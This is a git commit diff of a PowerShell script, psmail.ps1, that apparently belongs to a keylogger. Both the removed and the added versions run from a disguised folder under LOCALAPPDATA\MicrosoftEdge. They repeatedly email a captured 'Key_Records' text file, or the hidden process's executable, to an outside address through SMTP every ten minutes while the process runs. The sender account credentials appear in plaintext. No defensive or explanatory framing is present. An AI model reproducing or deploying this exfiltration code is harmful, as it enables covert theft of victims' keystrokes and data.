62fea3cb8fc91f3e5e758f7d0bd9c17615055f3b
Mirozo <82079025+MirozoPL@users.noreply.github.com>
2022-12-16 08:07:24 +0100

    Update psmail.ps1

--- psmail.ps1
+++ psmail.ps1
@@ -1,34 +1,14 @@
-Set-Location $env:LOCALAPPDATA"\MicrosoftEdge\404eb8b50ea0d5d6\"
-$SMTPServer = "smtp.mail.com"
-$SMTPPort = "587"
-$Username = "verynotsus@mail.com"
-$Password = "verynotsuse"
-
-Do
+Set-Location $env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\
+while (Get-Process -Name "ygoLa8SyqmQTGsoh" -ErrorAction SilentlyContinue)
 {
-
-$to = "resultsiliketowatch@op.pl"
-$subject = "Key_Records"
-$body = "Key Records"
-$attachment = "nmaqncdCwP.txt"
-
-$message = New-Object System.Net.Mail.MailMessage
-$message.subject = $subject
-$message.body = $body
-$message.to.add($to)
-$message.from = $username
-$message.attachments.add($attachment)
-$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
-$smtp.EnableSSL = $true
-$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
-$smtp.send($message);
-
-start-sleep 5
-
-$message.Dispose() 
-
-$proc = Get-Process
-
-start-sleep 600
-
-} While ($proc.name -contains 'ygoLa8SyqmQTGsoh') 
+    $Username = "jankowalski69zs@outlook.com"
+    $Password = ConvertTo-SecureString "JanKowalski1" -AsPlainText -Force
+    $Credential = New-Object System.Management.Automation.PSCredential($Username,$Password)
+    $From = "jankowalski69zs@outlook.com"
+    $To = "resultsiliketowatch@op.pl"
+    $Subject = "Email with Attachment"
+    $Body = "This is an email with an attachment."
+    $Attachment = ".\ygoLa8SyqmQTGsoh.exe"
+    Send-MailMessage -SmtpServer "smtp-mail.outlook.com" -UseSsl -Port 587 -Credential $Credential -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment
+    Start-Sleep -Seconds 600
+}
